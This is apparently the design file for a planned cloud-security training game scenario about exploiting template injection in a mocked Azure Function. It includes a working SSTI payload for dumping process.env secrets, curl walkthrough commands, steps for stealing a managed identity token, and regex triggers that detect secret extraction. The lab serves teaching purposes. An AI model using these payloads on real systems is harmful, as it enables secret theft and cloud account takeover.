# Scenario 09: Azure Function Code Injection

**Status:** Planned
**Difficulty:** Advanced
**Estimated Time:** 35-40 minutes

## Overview

Players discover and exploit a vulnerable Azure Function that allows code injection, leading to credential theft and access to the function's managed identity.

## Learning Objectives

- Understand Azure Functions security model
- Learn about function app misconfigurations
- Recognize code injection vulnerabilities in serverless
- Understand function app identity and secrets

## Attack Narrative

You've discovered an Azure Function app that processes user input without proper validation. Your mission is to exploit this vulnerability to inject code, access the function's configuration secrets, and abuse its managed identity for further access.

## Starting Intel

- Target function: `func-data-api`
- HTTP trigger with user input
- Function processes JSON payloads
- Suspected: Input not sanitized

## Resources

### Function App: func-data-api
- Runtime: Node.js 18
- Trigger: HTTP (anonymous auth - dangerous)
- Managed Identity: System-assigned
- App Settings contain secrets

### Vulnerable Endpoint
```
POST https://func-data-api.azurewebsites.net/api/process
Content-Type: application/json

{
  "data": "user input here",
  "template": "{{user_controlled}}"  // Injection point
}
```

### Function App Settings (secrets)
| Setting | Value |
|---------|-------|
| STORAGE_CONNECTION_STRING | Full connection string |
| DATABASE_PASSWORD | Production DB password |
| API_KEY | Third-party API key |
| AzureWebJobsStorage | Runtime storage connection |

### Managed Identity Permissions
- Storage Blob Data Contributor on storage-prod
- Reader on resource group

## Objectives

| Order | ID | Description | Trigger | Points |
|-------|-----|-------------|---------|--------|
| 1 | discover_function | Discover the function app endpoint | `az functionapp list` | 75 |
| 2 | test_injection | Test for code injection vulnerability | `curl.*func-data-api` | 125 |
| 3 | extract_secrets | Extract app settings/environment variables | `regex:env\|process.env\|app.*settings` | 150 |
| 4 | abuse_identity | Abuse function's managed identity | `regex:IDENTITY_ENDPOINT\|MSI_ENDPOINT` | 175 |

**Total Points:** 525

## Hints

### discover_function
- Level 1 (15 pts): "Azure Function apps can be listed via CLI"
- Level 2 (35 pts): "az functionapp list; az functionapp show --name func-data-api"

### test_injection
- Level 1 (25 pts): "The function processes templates - what if the template contains code?"
- Level 2 (60 pts): "Try injecting: {{constructor.constructor('return process.env')()}}"

### extract_secrets
- Level 1 (30 pts): "Function app settings are available as environment variables"
- Level 2 (75 pts): "Inject code to dump process.env or use az functionapp config"

### abuse_identity
- Level 1 (35 pts): "Function apps can have managed identities with their own IMDS-like endpoint"
- Level 2 (85 pts): "Look for IDENTITY_ENDPOINT and IDENTITY_HEADER in the environment"

## Solution Walkthrough

```bash
# Step 1: Enumerate function apps
az functionapp list
az functionapp show --name func-data-api --resource-group functions-rg

# Step 2: Test injection
curl -X POST https://func-data-api.azurewebsites.net/api/process \
  -H "Content-Type: application/json" \
  -d '{"template": "{{constructor.constructor('\''return 1+1'\'')()}}"}'

# Step 3: Extract environment variables via injection
curl -X POST https://func-data-api.azurewebsites.net/api/process \
  -H "Content-Type: application/json" \
  -d '{"template": "{{constructor.constructor('\''return JSON.stringify(process.env)'\'')()}}"}'

# Or via CLI if you have access:
az functionapp config appsettings list --name func-data-api --resource-group functions-rg

# Step 4: Get managed identity token
# From injected code, access:
# process.env.IDENTITY_ENDPOINT + "?resource=https://management.azure.com/&api-version=2019-08-01"
# With header: X-IDENTITY-HEADER = process.env.IDENTITY_HEADER
```

## Debrief Topics

- Azure Functions authentication levels
- Serverless security best practices
- Input validation and sanitization
- App settings vs Key Vault references
- Function app managed identity scoping
- Diagnostic logs for functions
- Application Insights security

## Real-World References

- MITRE ATT&CK: T1059.007 (Command and Scripting Interpreter: JavaScript)
- OWASP: Server-Side Template Injection (SSTI)
- Azure Security: Securing Azure Functions

## Implementation Notes

Requires:
- az functionapp list/show commands
- Mock HTTP endpoint for function trigger
- Template injection simulation
- Environment variable exposure mock
- Function app IMDS-equivalent mock
